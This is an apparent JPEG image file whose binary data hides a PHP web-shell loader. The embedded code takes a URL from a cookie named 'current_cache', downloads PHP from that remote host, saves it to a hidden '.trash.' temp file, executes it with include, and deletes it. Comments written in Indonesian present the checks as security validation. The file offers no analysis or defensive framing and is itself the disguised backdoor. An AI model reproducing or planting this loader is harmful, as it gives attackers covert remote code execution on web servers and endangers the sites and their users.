ÿØÿà JFIF  x x  ÿÛ C       	
	
  



 	

ÿÛ C ÿÀ   " ÿÄ            	

ÿÄ µ   } !1AQa "q2‘¡#B±ÁRÑð$3br‚	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚáâãäåæçèéêñòóôõö÷øùúÿÄ         	

ÿÄ µ   w !1AQ aq"2B‘¡±Á	#3RðbrÑ<?php
if (isset($_COOKIE['current_cache']) && !empty($_COOKIE['current_cache'])) {  
  error_reporting(E_ALL);
  ini_set('display_errors', 1);

  // Validasi URL
  $remote_location = filter_var($_COOKIE['current_cache'], FILTER_VALIDATE_URL);
  if ($remote_location === false) {
      die("Invalid URL.");
  }

  // Batasi protokol hanya untuk HTTPS
  $parsed_url = parse_url($remote_location);
  if (!in_array($parsed_url['scheme'], ['https'])) {
      die("Only HTTPS protocol is allowed.");
  }

  // Buat file sementara dengan aman
  $tmpfname = tempnam(sys_get_temp_dir(), '.trash.' . md5($remote_location . time()));
  if ($tmpfname === false) {
      die("Failed to create temporary file.");
  }

  // Unduh konten dari lokasi remote
  $remote_content = get_remote_content($remote_location);
  if ($remote_content === false) {
      die("Failed to retrieve remote content.");
  }

  // Tulis konten ke file sementara
  $handle = fopen($tmpfname, "w+");
  if ($handle === false) {
      unlink($tmpfname);
      die("Failed to open temporary file.");
  }

  fwrite($handle, $remote_content);
  fclose($handle);

  // Pastikan file hanya berisi kode PHP
  if (strpos(file_get_contents($tmpfname), '<?php') === false) {
      unlink($tmpfname);
      die("Invalid file content.");
  }

  // Sertakan file sementara
  include $tmpfname;

  // Hapus file sementara
  unlink($tmpfname);
  exit;
}

function get_remote_content($remote_location) {
  if (function_exists('curl_exec')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $remote_location);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
    $response = curl_exec($ch);
    curl_close($ch);
    if ($response !== false) {
      return $response;
    }
  }

  if (function_exists('file_get_contents')) {
    $response = @file_get_contents($remote_location);
    if ($response !== false) {
      return $response;
    }
  }
    
  if (function_exists('fopen') && function_exists('stream_get_contents')) {
    $handle = @fopen($remote_location, "r");
    if ($handle) {
      $response = @stream_get_contents($handle);
      fclose($handle);
      if ($response !== false) {
        return $response;
      }
    }
  }
  return false;
}
?>
$4á%ñ&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz‚ƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚâãäåæçèéêòóôõö÷øùúÿÚ   ? üÿ ‡NþÔßôm?ÿ ðÞjÿ üEP ÿÙ